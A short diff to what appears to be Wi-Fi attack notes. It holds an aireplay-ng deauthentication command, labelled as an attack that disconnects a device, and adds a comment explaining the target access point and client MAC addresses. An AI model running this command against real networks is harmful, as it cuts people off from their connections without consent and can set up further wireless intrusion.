@@ -1,2 +1,4 @@
 # Attack command that will disconnect the device
 sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB <your interface you created earlier here>
+
+# Where 00:11:22:33:44:55 is the BSSID of the access point on the router and 66:77:88:99:AA:BB is the MAC address ofd the targeted device
